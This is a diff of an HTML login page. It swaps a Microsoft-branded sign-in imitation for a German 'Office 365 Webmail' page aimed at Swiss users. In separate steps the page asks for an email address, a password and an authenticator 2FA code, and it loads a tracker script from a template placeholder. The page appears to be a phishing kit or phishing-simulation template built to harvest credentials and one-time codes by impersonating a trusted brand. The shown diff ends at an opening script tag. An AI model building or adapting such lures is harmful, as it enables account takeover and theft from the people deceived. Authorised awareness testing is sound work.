@@ -1,47 +1,59 @@
 <!doctype html>
-<html lang="en">
+<html lang="de">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Sign in to your account</title>
-<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 21 21'%3E%3Crect x='1' y='1' width='9' height='9' fill='%23F25022'/%3E%3Crect x='11' y='1' width='9' height='9' fill='%237FBA00'/%3E%3Crect x='1' y='11' width='9' height='9' fill='%2300A4EF'/%3E%3Crect x='11' y='11' width='9' height='9' fill='%23FFB900'/%3E%3C/svg%3E">
+<title>Webmail Anmeldung</title>
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Crect width='24' height='24' rx='4' fill='%232b6cb0'/%3E%3Cpath d='M5 8l7 5 7-5' fill='none' stroke='%23fff' stroke-width='1.6'/%3E%3Crect x='5' y='7' width='14' height='10' rx='1.5' fill='none' stroke='%23fff' stroke-width='1.6'/%3E%3C/svg%3E">
 <link rel="stylesheet" href="assets/style.css">
 </head>
 <body>
 <div class="signin-shell">
   <div class="signin-card" data-step="email">
-    <div class="signin-logo"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 108 24" width="108" height="24" aria-label="Microsoft"><g><rect x="0" y="0" width="10" height="10" fill="#F25022"/><rect x="11" y="0" width="10" height="10" fill="#7FBA00"/><rect x="0" y="11" width="10" height="10" fill="#00A4EF"/><rect x="11" y="11" width="10" height="10" fill="#FFB900"/></g><text x="27" y="17" fill="#737373" font-family="'Segoe UI', system-ui, sans-serif" font-size="15" font-weight="400">Microsoft</text></svg></div>
+    <div class="signin-brand">
+      <span class="signin-glyph" aria-hidden="true">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="34" height="34">
+          <rect width="24" height="24" rx="5" fill="#2b6cb0"/>
+          <rect x="5" y="7" width="14" height="10" rx="1.5" fill="none" stroke="#ffffff" stroke-width="1.5"/>
+          <path d="M5.5 8l6.5 4.6L18.5 8" fill="none" stroke="#ffffff" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </span>
+      <span class="signin-brandname">Office&nbsp;365 Webmail</span>
+    </div>
 
     <form id="step-email" autocomplete="off">
-      <div class="signin-title">Sign in</div>
-      <input type="email" name="email" class="signin-field" placeholder="Email, phone, or Skype" required autofocus>
+      <div class="signin-title">Webmail Anmeldung</div>
+      <p class="signin-sub">Bitte melden Sie sich mit Ihrer E-Mail-Adresse an, um auf Ihr Postfach zuzugreifen.</p>
+      <label class="signin-label" for="f-email">E-Mail-Adresse</label>
+      <input id="f-email" type="email" name="email" class="signin-field" placeholder="name@firma.ch" required autofocus>
       <div class="signin-meta-block">
-        <div>No account? <a href="#">Create one!</a></div>
-        <div><a href="#">Can&#39;t access your account?</a></div>
+        <div><a href="#">Konto-Zugang vergessen?</a></div>
       </div>
       <div class="signin-actions">
-        <button type="submit" class="signin-btn">Next</button>
+        <button type="submit" class="signin-btn">Weiter</button>
       </div>
     </form>
 
     <form id="step-password" autocomplete="off" style="display:none">
       <div class="signin-account-chip"><span class="dot"></span><span id="email-echo">user@example.com</span></div>
-      <div class="signin-title">Enter password</div>
-      <input type="password" name="password" class="signin-field" placeholder="Password" required>
-      <div class="signin-meta"><a href="#">Forgot my password</a></div>
-      <div class="signin-actions"><button type="submit" class="signin-btn">Sign in</button></div>
+      <div class="signin-title">Passwort eingeben</div>
+      <label class="signin-label" for="f-pwd">Passwort</label>
+      <input id="f-pwd" type="password" name="password" class="signin-field" placeholder="Passwort" required>
+      <div class="signin-meta"><a href="#">Passwort vergessen?</a></div>
+      <div class="signin-actions"><button type="submit" class="signin-btn">Anmelden</button></div>
     </form>
 
     <form id="step-2fa" autocomplete="off" style="display:none">
       <div class="signin-account-chip"><span class="dot"></span><span id="email-echo-2">user@example.com</span></div>
-      <div class="signin-title">Verify your identity</div>
-      <p class="signin-sub">Enter the code displayed in your authenticator app.</p>
-      <input type="text" name="code_2fa" class="signin-field code-box" inputmode="numeric" pattern="[0-9]{4,8}" maxlength="8" placeholder="000000" required>
-      <div class="signin-actions"><button type="submit" class="signin-btn">Verify</button></div>
+      <div class="signin-title">Code eingeben</div>
+      <p class="signin-sub">Geben Sie den Bestaetigungscode aus Ihrer Authenticator-App ein.</p>
+      <label class="signin-label" for="f-2fa">Bestaetigungscode</label>
+      <input id="f-2fa" type="text" name="code_2fa" class="signin-field code-box" inputmode="numeric" pattern="[0-9]{4,8}" maxlength="8" placeholder="000000" required>
+      <div class="signin-actions"><button type="submit" class="signin-btn">Bestaetigen</button></div>
     </form>
   </div>
+  <div class="signin-footer"><span>Nutzungsbedingungen &middot; Datenschutz &middot; Webmail Portal</span></div>
 </div>
-<div class="signin-footer"><span>Terms of use &middot; Privacy &amp; cookies &middot; &hellip;</span></div>
 
 <script data-tracker src="{{TRACKER_URL_ATTR}}"></script>
 <script>
